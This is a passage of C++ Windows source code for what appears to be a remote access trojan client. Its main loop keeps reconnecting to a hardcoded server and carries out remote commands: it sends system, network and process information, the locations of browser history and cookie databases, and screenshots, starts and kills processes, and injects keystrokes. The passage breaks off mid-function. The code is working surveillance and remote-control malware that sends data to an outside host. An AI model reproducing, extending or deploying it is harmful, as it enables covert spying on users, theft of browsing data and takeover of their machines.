        // Wait for the process to start
        Sleep(1000); // Wait a bit longer for the process to start

        // Get the actual process name from the shortcut
        std::string processName = "";

        // Extract process name from shortcut path
        size_t lastSlash = foundPath.find_last_of("\\/");
        if (lastSlash != std::string::npos)
        {
            std::string shortcutName = foundPath.substr(lastSlash + 1);
            // Remove .lnk extension
            size_t dotPos = shortcutName.find_last_of(".");
            if (dotPos != std::string::npos)
            {
                processName = shortcutName.substr(0, dotPos);
            }
        }

        // Find new processes that weren't running before
        DWORD newPid = 0;
        if (EnumProcesses(processes, sizeof(processes), &bytesReturned))
        {
            DWORD processCount = bytesReturned / sizeof(DWORD);
            for (DWORD i = 0; i < processCount; i++)
            {
                if (processes[i] != 0)
                {
                    // Check if this is a new process
                    bool isNewProcess = true;
                    for (DWORD oldPid : initialPids)
                    {
                        if (processes[i] == oldPid)
                        {
                            isNewProcess = false;
                            break;
                        }
                    }

                    if (isNewProcess)
                    {
                        // Get process name to check if it matches what we're looking for
                        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
                        if (hProcess)
                        {
                            char exePath[MAX_PATH];
                            if (GetModuleFileNameExA(hProcess, NULL, exePath, MAX_PATH) > 0)
                            {
                                std::string exeName = exePath;
                                size_t lastBackslash = exeName.find_last_of("\\/");
                                if (lastBackslash != std::string::npos)
                                {
                                    exeName = exeName.substr(lastBackslash + 1);
                                }

                                // Remove extension
                                size_t lastDot = exeName.find_last_of(".");
                                if (lastDot != std::string::npos)
                                {
                                    exeName = exeName.substr(0, lastDot);
                                }

                                // Convert to lowercase for case-insensitive comparison
                                std::string lowerExeName = exeName;
                                std::transform(lowerExeName.begin(), lowerExeName.end(), lowerExeName.begin(), ::tolower);

                                std::string lowerProcessName = processName;
                                std::transform(lowerProcessName.begin(), lowerProcessName.end(), lowerProcessName.begin(), ::tolower);

                                // Also check against the original app name
                                std::string lowerAppName = appName;
                                std::transform(lowerAppName.begin(), lowerAppName.end(), lowerAppName.begin(), ::tolower);

                                if (lowerExeName.find(lowerProcessName) != std::string::npos ||
                                    lowerExeName.find(lowerAppName) != std::string::npos)
                                {
                                    newPid = processes[i];
                                    CloseHandle(hProcess);
                                    break;
                                }
                            }
                            CloseHandle(hProcess);
                        }
                    }
                }
            }
        }

        if (newPid != 0)
        {
            return "Successfully launched application from Start Menu: " + foundPath + " (Actual PID: " + std::to_string(newPid) + ")";
        }

        // If we couldn't find the PID by name, try to get it by window title
        Sleep(500); // Wait a bit more for windows to appear
        HWND hwndTemp = FindWindowA(NULL, NULL);
        while (hwndTemp != NULL)
        {
            char windowTitle[256];
            GetWindowTextA(hwndTemp, windowTitle, sizeof(windowTitle));

            // If window title contains app name, it's likely our app
            std::string title = windowTitle;
            std::string lowerTitle = title;
            std::transform(lowerTitle.begin(), lowerTitle.end(), lowerTitle.begin(), ::tolower);

            std::string lowerAppName = appName;
            std::transform(lowerAppName.begin(), lowerAppName.end(), lowerAppName.begin(), ::tolower);

            if (!title.empty() && (lowerTitle.find(lowerAppName) != std::string::npos))
            {
                DWORD windowPid;
                GetWindowThreadProcessId(hwndTemp, &windowPid);
                if (windowPid != 0)
                {
                    return "Successfully launched application from Start Menu: " + foundPath + " (Actual PID: " + std::to_string(windowPid) + ")";
                }
            }

            hwndTemp = GetWindow(hwndTemp, GW_HWNDNEXT);
        }

        return "Successfully launched application from Start Menu: " + foundPath + " (PID unknown - could not determine actual process)";
    }

    // If ShellExecute fails, try system command
    std::string sysCmd = "start \"\" \"" + foundPath + "\"";
    int sysResult = system(sysCmd.c_str());
    if (sysResult == 0)
    {
        return "Successfully launched application using system command: " + foundPath + " (PID unknown - system() call)";
    }

    return "Failed to launch application: " + foundPath + " (Error: " + std::to_string(GetLastError()) + ")";
}

std::string send_keystrokes_at_cursor(const std::string &keys)
{
    // No need to find or activate a window - just send keystrokes to current focus

    // Use SendInput for reliable input
    std::vector<INPUT> inputs;

    size_t i = 0;
    while (i < keys.length())
    {
        // Check for special key sequences in curly braces
        if (keys[i] == '{')
        {
            size_t endBrace = keys.find('}', i);
            if (endBrace != std::string::npos)
            {
                std::string specialKey = keys.substr(i, endBrace - i + 1);
                processSpecialKey(specialKey, inputs);
                i = endBrace + 1;
                continue;
            }
        }

        // Regular character processing
        char c = keys[i];
        SHORT vk = VkKeyScanA(c);
        BYTE vkCode = LOBYTE(vk);
        BYTE shiftState = HIBYTE(vk);

        // Add shift key down if needed
        if (shiftState & 1)
        {
            INPUT shiftDown = {0};
            shiftDown.type = INPUT_KEYBOARD;
            shiftDown.ki.wVk = VK_SHIFT;
            inputs.push_back(shiftDown);
        }

        // Key down
        INPUT keyDown = {0};
        keyDown.type = INPUT_KEYBOARD;
        keyDown.ki.wVk = vkCode;
        inputs.push_back(keyDown);

        // Key up
        INPUT keyUp = {0};
        keyUp.type = INPUT_KEYBOARD;
        keyUp.ki.wVk = vkCode;
        keyUp.ki.dwFlags = KEYEVENTF_KEYUP;
        inputs.push_back(keyUp);

        // Add shift key up if needed
        if (shiftState & 1)
        {
            INPUT shiftUp = {0};
            shiftUp.type = INPUT_KEYBOARD;
            shiftUp.ki.wVk = VK_SHIFT;
            shiftUp.ki.dwFlags = KEYEVENTF_KEYUP;
            inputs.push_back(shiftUp);
        }

        i++;
    }

    // Send all inputs
    if (!inputs.empty())
    {
        SendInput(inputs.size(), inputs.data(), sizeof(INPUT));
    }

    // Get info about the current foreground window for reporting
    HWND currentForeground = GetForegroundWindow();
    DWORD pid = 0;
    GetWindowThreadProcessId(currentForeground, &pid);

    char windowTitle[256] = {0};
    GetWindowTextA(currentForeground, windowTitle, sizeof(windowTitle));

    std::string windowInfo = windowTitle[0] ? std::string(" (Current window: ") + windowTitle + ")" : "";
    return "Keystrokes sent to current focus" + windowInfo;
}

// Helper function to handle special key sequences
void processSpecialKey(const std::string &key, std::vector<INPUT> &inputs)
{
    if (key == "{ENTER}" || key == "{RETURN}")
    {
        INPUT keyDown = {0};
        keyDown.type = INPUT_KEYBOARD;
        keyDown.ki.wVk = VK_RETURN;
        inputs.push_back(keyDown);

        INPUT keyUp = {0};
        keyUp.type = INPUT_KEYBOARD;
        keyUp.ki.wVk = VK_RETURN;
        keyUp.ki.dwFlags = KEYEVENTF_KEYUP;
        inputs.push_back(keyUp);
    }
    else if (key == "{TAB}")
    {
        INPUT keyDown = {0};
        keyDown.type = INPUT_KEYBOARD;
        keyDown.ki.wVk = VK_TAB;
        inputs.push_back(keyDown);

        INPUT keyUp = {0};
        keyUp.type = INPUT_KEYBOARD;
        keyUp.ki.wVk = VK_TAB;
        keyUp.ki.dwFlags = KEYEVENTF_KEYUP;
        inputs.push_back(keyUp);
    }
    else if (key == "{SPACE}")
    {
        INPUT keyDown = {0};
        keyDown.type = INPUT_KEYBOARD;
        keyDown.ki.wVk = VK_SPACE;
        inputs.push_back(keyDown);

        INPUT keyUp = {0};
        keyUp.type = INPUT_KEYBOARD;
        keyUp.ki.wVk = VK_SPACE;
        keyUp.ki.dwFlags = KEYEVENTF_KEYUP;
        inputs.push_back(keyUp);
    }
    // Add more special keys as needed
}

// Function to open YouTube links without ads
std::string open_youtube_without_ads(const std::string &url)
{
    // Check if the URL is a YouTube link
    if (url.find("youtube.com") == std::string::npos && url.find("youtu.be") == std::string::npos)
    {
        return "Not a YouTube URL: " + url;
    }

    // Try to find Chrome or Edge browser
    std::vector<std::string> browserPaths = {
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"};

    std::string browserPath;
    for (const auto &path : browserPaths)
    {
        if (GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES)
        {
            browserPath = path;
            break;
        }
    }

    if (browserPath.empty())
    {
        // If specific browsers not found, use default browser
        ShellExecuteA(NULL, "open", url.c_str(), NULL, NULL, SW_SHOWNORMAL);
        return "Opened URL with default browser (ad blocking not guaranteed): " + url;
    }

    // Construct command line with ad-blocking parameters
    // For Chrome/Edge, we'll use the "--incognito" flag which might help with some ads
    // In a real implementation, you might want to use specific extensions or parameters
    std::string commandLine = "\"" + browserPath + "\" --incognito " + url;

    // Create process to launch browser
    STARTUPINFOA si = {sizeof(STARTUPINFOA)};
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;

    if (CreateProcessA(NULL, (LPSTR)commandLine.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return "Opened YouTube URL in incognito mode (may reduce ads): " + url;
    }
    else
    {
        return "Failed to launch browser: " + std::to_string(GetLastError());
    }
}

// Function to search for a specific process
std::string search_process(const std::string &process_name)
{
    std::stringstream result;
    int count = 0;

    // Convert search term to lowercase for case-insensitive comparison
    std::string search_term = process_name;
    std::transform(search_term.begin(), search_term.end(), search_term.begin(), ::tolower);

    result << "Searching for processes matching: " << process_name << "\n\n";
    result << "PID\tProcess Name\n";
    result << "---\t------------\n";

    // Create a snapshot of all processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        return "Error: Failed to create process snapshot";
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Get the first process
    if (!Process32First(hSnapshot, &pe32))
    {
        CloseHandle(hSnapshot);
        return "Error: Failed to get process information";
    }

    // Iterate through all processes
    do
    {
        std::string current_process;

#ifdef UNICODE
        // Convert wide string to narrow string
        char narrow_name[MAX_PATH];
        WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, narrow_name, MAX_PATH, NULL, NULL);
        current_process = std::string(narrow_name);
#else
        // In ANSI mode, just use the string directly
        current_process = std::string(pe32.szExeFile);
#endif

        // Convert to lowercase for comparison
        std::string current_process_lower = current_process;
        std::transform(current_process_lower.begin(), current_process_lower.end(),
                       current_process_lower.begin(), ::tolower);

        // Check if the process name contains the search term
        if (current_process_lower.find(search_term) != std::string::npos)
        {
            result << pe32.th32ProcessID << "\t" << current_process << "\n";
            count++;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);

    result << "\nFound " << count << " matching process(es)";
    return result.str();
}

// Add this new function to get network information
std::string get_network_info()
{
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    std::string info = "=== NETWORK INFORMATION ===\n\n";

    // Get hostname
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    info += "Hostname: " + std::string(hostname) + "\n";

    // Get adapter information
    IP_ADAPTER_INFO *pAdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
    ULONG bufLen = sizeof(IP_ADAPTER_INFO);

    if (GetAdaptersInfo(pAdapterInfo, &bufLen) == ERROR_BUFFER_OVERFLOW)
    {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO *)malloc(bufLen);
    }

    if (GetAdaptersInfo(pAdapterInfo, &bufLen) == NO_ERROR)
    {
        IP_ADAPTER_INFO *pAdapter = pAdapterInfo;
        int adapterCount = 0;

        while (pAdapter)
        {
            adapterCount++;
            info += "\n=== ADAPTER " + std::to_string(adapterCount) + " ===\n";
            info += "Description: " + std::string(pAdapter->Description) + "\n";
            info += "Adapter Name: " + std::string(pAdapter->AdapterName) + "\n";
            info += "MAC Address: ";

            for (UINT i = 0; i < pAdapter->AddressLength; i++)
            {
                char temp[3];
                sprintf(temp, "%02X", pAdapter->Address[i]);
                info += std::string(temp);
                if (i < pAdapter->AddressLength - 1)
                {
                    info += "-";
                }
            }
            info += "\n";

            info += "IP Address: " + std::string(pAdapter->IpAddressList.IpAddress.String) + "\n";
            info += "Subnet Mask: " + std::string(pAdapter->IpAddressList.IpMask.String) + "\n";
            info += "Gateway: " + std::string(pAdapter->GatewayList.IpAddress.String) + "\n";

            // DHCP information
            if (pAdapter->DhcpEnabled)
            {
                info += "DHCP Enabled: Yes\n";
                info += "DHCP Server: " + std::string(pAdapter->DhcpServer.IpAddress.String) + "\n";
                info += "Lease Obtained: " + std::to_string(pAdapter->LeaseObtained) + "\n";
            }
            else
            {
                info += "DHCP Enabled: No\n";
            }

            pAdapter = pAdapter->Next;
        }
    }

    free(pAdapterInfo);

    // Get active connections
    info += "\n=== ACTIVE CONNECTIONS ===\n";

    MIB_TCPTABLE_OWNER_PID *pTcpTable = NULL;
    DWORD dwSize = 0;
    DWORD dwRetVal = 0;

    // Make an initial call to GetTcpTable to get the necessary size
    dwRetVal = GetExtendedTcpTable(NULL, &dwSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
    if (dwRetVal == ERROR_INSUFFICIENT_BUFFER)
    {
        pTcpTable = (MIB_TCPTABLE_OWNER_PID *)malloc(dwSize);
        if (pTcpTable != NULL)
        {
            dwRetVal = GetExtendedTcpTable(pTcpTable, &dwSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
            if (dwRetVal == NO_ERROR)
            {
                info += "TCP Connections: " + std::to_string(pTcpTable->dwNumEntries) + "\n\n";

                for (DWORD i = 0; i < pTcpTable->dwNumEntries; i++)
                {
                    // Convert IP addresses to strings
                    struct in_addr localAddr, remoteAddr;
                    localAddr.s_addr = pTcpTable->table[i].dwLocalAddr;
                    remoteAddr.s_addr = pTcpTable->table[i].dwRemoteAddr;

                    char localAddrStr[INET_ADDRSTRLEN];
                    char remoteAddrStr[INET_ADDRSTRLEN];
                    inet_ntop(AF_INET, &localAddr, localAddrStr, sizeof(localAddrStr));
                    inet_ntop(AF_INET, &remoteAddr, remoteAddrStr, sizeof(remoteAddrStr));

                    // Convert ports from network byte order
                    DWORD localPort = ntohs((u_short)pTcpTable->table[i].dwLocalPort);
                    DWORD remotePort = ntohs((u_short)pTcpTable->table[i].dwRemotePort);

                    // Get state
                    std::string state;
                    switch (pTcpTable->table[i].dwState)
                    {
                    case MIB_TCP_STATE_CLOSED:
                        state = "CLOSED";
                        break;
                    case MIB_TCP_STATE_LISTEN:
                        state = "LISTENING";
                        break;
                    case MIB_TCP_STATE_SYN_SENT:
                        state = "SYN_SENT";
                        break;
                    case MIB_TCP_STATE_SYN_RCVD:
                        state = "SYN_RECEIVED";
                        break;
                    case MIB_TCP_STATE_ESTAB:
                        state = "ESTABLISHED";
                        break;
                    case MIB_TCP_STATE_FIN_WAIT1:
                        state = "FIN_WAIT1";
                        break;
                    case MIB_TCP_STATE_FIN_WAIT2:
                        state = "FIN_WAIT2";
                        break;
                    case MIB_TCP_STATE_CLOSE_WAIT:
                        state = "CLOSE_WAIT";
                        break;
                    case MIB_TCP_STATE_CLOSING:
                        state = "CLOSING";
                        break;
                    case MIB_TCP_STATE_LAST_ACK:
                        state = "LAST_ACK";
                        break;
                    case MIB_TCP_STATE_TIME_WAIT:
                        state = "TIME_WAIT";
                        break;
                    case MIB_TCP_STATE_DELETE_TCB:
                        state = "DELETE_TCB";
                        break;
                    default:
                        state = "UNKNOWN";
                        break;
                    }

                    info += "Connection " + std::to_string(i + 1) + ":\n";
                    info += "  Local: " + std::string(localAddrStr) + ":" + std::to_string(localPort) + "\n";
                    info += "  Remote: " + std::string(remoteAddrStr) + ":" + std::to_string(remotePort) + "\n";
                    info += "  State: " + state + "\n";
                    info += "  PID: " + std::to_string(pTcpTable->table[i].dwOwningPid) + "\n\n";
                }
            }
            free(pTcpTable);
        }
    }

    WSACleanup();
    info += "##END_OF_NETWORK_INFO##";
    return info;
}

// Add this new function to get system logs
std::string get_system_logs(const char *log_type = "System", int num_entries = 50)
{
    std::string result = "=== SYSTEM LOGS ===\n\n";

    // Convert log_type to wstring
    std::wstring wLogType;
    if (strcmp(log_type, "System") == 0)
        wLogType = L"System";
    else if (strcmp(log_type, "Application") == 0)
        wLogType = L"Application";
    else if (strcmp(log_type, "Security") == 0)
        wLogType = L"Security";
    else
        wLogType = L"System"; // Default to System logs

    HANDLE hEventLog = OpenEventLogW(NULL, wLogType.c_str());
    if (!hEventLog)
    {
        return result + "Failed to open event log.\n";
    }

    DWORD dwReadFlags = EVENTLOG_BACKWARDS_READ | EVENTLOG_SEQUENTIAL_READ;
    DWORD dwRecordOffset = 0;
    DWORD dwBytesRead = 0;
    DWORD dwBytesNeeded = 0;

    // Get the size needed for the buffer
    if (!GetOldestEventLogRecord(hEventLog, &dwRecordOffset))
    {
        CloseEventLog(hEventLog);
        return result + "Failed to get oldest event log record.\n";
    }

    // Allocate a buffer for the event records
    DWORD dwBufferSize = 65536; // 64KB buffer
    BYTE *pBuffer = new BYTE[dwBufferSize];
    if (!pBuffer)
    {
        CloseEventLog(hEventLog);
        return result + "Failed to allocate memory for event log buffer.\n";
    }

    // Add log type to result
    result += "Log Type: " + std::string(log_type) + "\n\n";

    int count = 0;
    BOOL bStatus = TRUE;

    // Read event log entries
    while (count < num_entries && (bStatus = ReadEventLogW(
                                       hEventLog,
                                       dwReadFlags,
                                       0,
                                       pBuffer,
                                       dwBufferSize,
                                       &dwBytesRead,
                                       &dwBytesNeeded)))
    {
        DWORD dwRecordCount = dwBytesRead / sizeof(EVENTLOGRECORD);
        EVENTLOGRECORD *pRecord = (EVENTLOGRECORD *)pBuffer;

        for (DWORD i = 0; i < dwRecordCount && count < num_entries; i++)
        {
            // Get the timestamp
            SYSTEMTIME st;
            FileTimeToSystemTime((FILETIME *)&pRecord->TimeGenerated, &st);

            char timeStr[30];
            sprintf_s(timeStr, sizeof(timeStr), "%04d-%02d-%02d %02d:%02d:%02d",
                      st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

            // Get event type as string
            std::string eventType;
            switch (pRecord->EventType)
            {
            case EVENTLOG_ERROR_TYPE:
                eventType = "ERROR";
                break;
            case EVENTLOG_WARNING_TYPE:
                eventType = "WARNING";
                break;
            case EVENTLOG_INFORMATION_TYPE:
                eventType = "INFORMATION";
                break;
            case EVENTLOG_AUDIT_SUCCESS:
                eventType = "AUDIT_SUCCESS";
                break;
            case EVENTLOG_AUDIT_FAILURE:
                eventType = "AUDIT_FAILURE";
                break;
            default:
                eventType = "UNKNOWN";
            }

            // Get source name
            LPWSTR sourceName = (LPWSTR)((BYTE *)pRecord + sizeof(EVENTLOGRECORD));

            // Convert source name to string
            char sourceNameStr[256] = {0};
            WideCharToMultiByte(CP_ACP, 0, sourceName, -1, sourceNameStr, sizeof(sourceNameStr), NULL, NULL);

            // Get event ID (without facility)
            DWORD eventID = pRecord->EventID & 0xFFFF;

            // Format the log entry
            char logEntry[512];
            sprintf_s(logEntry, sizeof(logEntry), "[%s] | %s | %s | EventID: %lu\n",
                      timeStr, eventType.c_str(), sourceNameStr, eventID);

            result += logEntry;
            count++;

            // Move to the next record
            pRecord = (EVENTLOGRECORD *)((BYTE *)pRecord + pRecord->Length);
        }
    }

    // Check if we failed because the buffer was too small
    if (!bStatus && GetLastError() == ERROR_INSUFFICIENT_BUFFER)
    {
        result += "\nWarning: Some log entries may have been skipped due to buffer size limitations.\n";
    }

    // Clean up
    delete[] pBuffer;
    CloseEventLog(hEventLog);

    return result;
}

// Function to extract browser history and cookies
std::string get_browser_data()
{
    std::string result = "=== BROWSER DATA ===\n\n";

    // Define paths to browser data for common browsers
    struct BrowserInfo
    {
        std::string name;
        std::string historyPath;
        std::string cookiesPath;
    };

    std::vector<BrowserInfo> browsers;

    // Get user profile path
    char userProfilePath[MAX_PATH];
    if (!ExpandEnvironmentStringsA("%USERPROFILE%", userProfilePath, MAX_PATH))
    {
        return result + "Failed to get user profile path.\n";
    }

    std::string profilePath = userProfilePath;

    // Chrome
    browsers.push_back({"Google Chrome",
                        profilePath + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",
                        profilePath + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"});

    // Firefox
    browsers.push_back({"Mozilla Firefox",
                        profilePath + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
                        profilePath + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"});

    // Edge
    browsers.push_back({"Microsoft Edge",
                        profilePath + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History",
                        profilePath + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies"});

    // Opera
    browsers.push_back({"Opera",
                        profilePath + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\History",
                        profilePath + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies"});

    // For each browser, try to extract data
    for (const auto &browser : browsers)
    {
        result += "Browser: " + browser.name + "\n";

        // Check if browser is installed by looking for history file
        bool browserFound = false;

        // For Firefox, we need to find the profile directory first
        if (browser.name == "Mozilla Firefox")
        {
            WIN32_FIND_DATAA findData;
            std::string searchPath = browser.historyPath + "\\*";
            HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

            if (hFind != INVALID_HANDLE_VALUE)
            {
                do
                {
                    if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                    {
                        if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0)
                        {
                            // Found a profile directory
                            std::string profileDir = browser.historyPath + "\\" + findData.cFileName;
                            std::string placesFile = profileDir + "\\places.sqlite";

                            if (GetFileAttributesA(placesFile.c_str()) != INVALID_FILE_ATTRIBUTES)
                            {
                                result += "  Profile: " + std::string(findData.cFileName) + "\n";
                                result += "  History database: " + placesFile + "\n";
                                browserFound = true;
                            }
                        }
                    }
                } while (FindNextFileA(hFind, &findData));

                FindClose(hFind);
            }
        }
        else
        {
            // For other browsers, just check if the history file exists
            if (GetFileAttributesA(browser.historyPath.c_str()) != INVALID_FILE_ATTRIBUTES)
            {
                result += "  History database: " + browser.historyPath + "\n";
                browserFound = true;
            }

            if (GetFileAttributesA(browser.cookiesPath.c_str()) != INVALID_FILE_ATTRIBUTES)
            {
                result += "  Cookies database: " + browser.cookiesPath + "\n";
                browserFound = true;
            }
        }

        if (!browserFound)
        {
            result += "  Not installed or no data found.\n";
        }

        result += "\n";
    }

    // Note: Actual extraction of history/cookies from SQLite databases would require
    // including SQLite library and implementing SQL queries, which is beyond the
    // scope of this simple implementation.
    result += "Note: To extract actual history and cookies data, you would need to:\n";
    result += "1. Copy these database files to a temporary location\n";
    result += "2. Use SQLite to query the data\n";
    result += "3. For Chrome/Edge/Opera: History table 'urls' contains browsing history\n";
    result += "4. For Firefox: places.sqlite contains history in 'moz_places' table\n";

    return result;
}

int main()
{
    // Initialize GDI+ at startup
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    gdiplusStartupInput.GdiplusVersion = 1;
    gdiplusStartupInput.DebugEventCallback = NULL;
    gdiplusStartupInput.SuppressBackgroundThread = FALSE;
    gdiplusStartupInput.SuppressExternalCodecs = FALSE;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in serv_addr;
    char buffer[BUFFER_SIZE] = {0};
    std::string response;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cout << "WSAStartup failed" << std::endl;
        return 1;
    }

    while (true)
    {
        // Create socket
        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        {
            std::cout << "Socket creation error: " << WSAGetLastError() << std::endl;
            Sleep(5000); // Use Sleep() on Windows (milliseconds)
            continue;
        }

        // Configure server address
        memset(&serv_addr, 0, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(PORT);

        // Convert IP address from text to binary
        if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0)
        {
            std::cout << "Invalid address or address not supported" << std::endl;
            closesocket(sock); // Use closesocket() on Windows
            Sleep(5000);
            continue;
        }

        // Connect to server
        std::cout << "Attempting to connect to server..." << std::endl;
        if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
        {
            std::cout << "Connection failed: " << WSAGetLastError() << std::endl;
            closesocket(sock);
            Sleep(5000);
            continue;
        }

        std::cout << "Connected to server" << std::endl;

        // Command processing loop
        while (true)
        {
            memset(buffer, 0, BUFFER_SIZE);
            int bytes_read = recv(sock, buffer, BUFFER_SIZE, 0);

            if (bytes_read <= 0)
            {
                std::cout << "Server disconnected" << std::endl;
                break;
            }

            std::cout << "Received command: " << buffer << std::endl;

            // Process commands
            if (strcmp(buffer, "sysinfo") == 0)
            {
                std::cout << "Sending system information..." << std::endl;
                response = get_sysinfo();

                // Send in chunks with a clear end marker
                const int chunk_size = 1024;
                for (size_t i = 0; i < response.length(); i += chunk_size)
                {
                    std::string chunk = response.substr(i, chunk_size);
                    send(sock, chunk.c_str(), chunk.length(), 0);
                    Sleep(50); // Small delay between chunks
                }

                // Send a special end marker
                const char *end_marker = "##END_OF_SYSINFO##";
                send(sock, end_marker, strlen(end_marker), 0);
            }
            else if (strcmp(buffer, "list_processes") == 0)
            {
                std::cout << "Listing all processes..." << std::endl;
                response = list_processes();

                // Send in chunks with a clear end marker
                const int chunk_size = 1024;
                for (size_t i = 0; i < response.length(); i += chunk_size)
                {
                    std::string chunk = response.substr(i, chunk_size);
                    send(sock, chunk.c_str(), chunk.length(), 0);
                    Sleep(50); // Small delay between chunks
                }

                // Send a special end marker
                const char *end_marker = "##END_OF_PROCESS_LIST##";
                send(sock, end_marker, strlen(end_marker), 0);
            }
            else if (strncmp(buffer, "start_process ", 14) == 0)
            {
                std::string command = buffer + 14;
                std::cout << "Starting process: " << command << std::endl;

                // Trim quotes if present
                if (command.size() >= 2 && command.front() == '"' && command.back() == '"')
                {
                    command = command.substr(1, command.size() - 2);
                }

                // Check if file exists before attempting to start
                if (GetFileAttributesA(command.c_str()) == INVALID_FILE_ATTRIBUTES)
                {
                    // Try expanding environment variables
                    char expandedPath[MAX_PATH];
                    if (ExpandEnvironmentStringsA(command.c_str(), expandedPath, MAX_PATH) > 0)
                    {
                        command = expandedPath;
                    }
                }

                // Verify the file exists
                if (GetFileAttributesA(command.c_str()) != INVALID_FILE_ATTRIBUTES)
                {
                    STARTUPINFOA si;
                    PROCESS_INFORMATION pi;

                    ZeroMemory(&si, sizeof(si));
                    si.cb = sizeof(si);
                    ZeroMemory(&pi, sizeof(pi));

                    // Create a non-const copy of the command string
                    char *cmd = _strdup(command.c_str());

                    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
                    {
                        free(cmd);
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                        response = "Process started successfully with PID: " + std::to_string(pi.dwProcessId);
                    }
                    else
                    {
                        free(cmd);
                        DWORD error = GetLastError();
                        response = "Failed to start process: " + std::to_string(error);
                    }
                }
                else
                {
                    response = "Failed to start process: File not found at path: " + command;
                }

                send(sock, response.c_str(), response.length(), 0);
            }
            else if (strcmp(buffer, "browser_data") == 0)
            {
                std::string browserData = get_browser_data();
                send(sock, browserData.c_str(), browserData.length(), 0);
            }
            else if (strncmp(buffer, "terminate_process ", 18) == 0)
            {
                std::string pid = buffer + 18;
                std::cout << "Terminating process with PID: " << pid << std::endl;
                response = terminate_process(pid);
                send(sock, response.c_str(), response.length(), 0);
            }
            else if (strcmp(buffer, "screenshot") == 0)
            {
                std::cout << "Taking screenshot..." << std::endl;
                if (!capture_and_send_screenshot(sock))
                {
                    const char *error_msg = "Failed to capture screenshot";
                    send(sock, error_msg, strlen(error_msg), 0);
                }
                std::cout << "Screenshot sent" << std::endl;
            }
            else if (strcmp(buffer, "kill_client") == 0)
            {
                std::cout << "Received kill command from server. Terminating..." << std::endl;
                // Send acknowledgment before terminating
                const char *ack_msg = "Client terminating on server request";
                send(sock, ack_msg, strlen(ack_msg), 0);

                // Clean up resources
                closesocket(sock);
                WSACleanup();
                Gdiplus::GdiplusShutdown(gdiplusToken);

                // Force exit the process
                ExitProcess(0);
            }
            else if (strcmp(buffer, "exit") == 0)
            {
                std::cout << "Disconnecting from server (will attempt to reconnect)..." << std::endl;
                const char *ack_msg = "Client disconnecting but will attempt to reconnect";
                send(sock, ack_msg, strlen(ack_msg), 0);

                // Close the current socket but don't exit the process
                closesocket(sock);

                // Don't call WSACleanup() or GdiplusShutdown() here to allow reconnection
                // Don't return from main function

                // Break out of the inner loop to attempt reconnection
                break;
            }
            else if (strcmp(buffer, "get_installed_software") == 0)
            {
                std::cout << "Getting installed software..." << std::endl;
                response = get_installed_software();
                send(sock, response.c_str(), response.length(), 0);
            }
            else if (strcmp(buffer, "installed_software") == 0)
            {
                std::cout << "Sending installed software list..." << std::endl;
                response = get_installed_software();

                // Send in chunks with a clear end marker
                const int chunk_size = 1024;
                for (size_t i = 0; i < response.length(); i += chunk_size)
                {
                    std::string chunk = response.substr(i, chunk_size);
                    send(sock, chunk.c_str(), chunk.length(), 0);
                    Sleep(50); // Small delay between chunks
                }

                // Send a special end marker
                const char *end_marker = "##END_OF_SOFTWARE_LIST##";
                send(sock, end_marker, strlen(end_marker), 0);
            }
            else if (strncmp(buffer, "send_keys ", 10) == 0)
            {
                std::string params = buffer + 10;
                size_t spacePos = params.find(' ');

                if (spacePos != std::string::npos)
                {
                    std::string processName = params.substr(0, spacePos);
                    std::string keys = params.substr(spacePos + 1);

                    std::cout << "Sending keystrokes to " << processName << ": " << keys << std::endl;
                    response = send_keystrokes(processName, keys);
                }
                else
                {
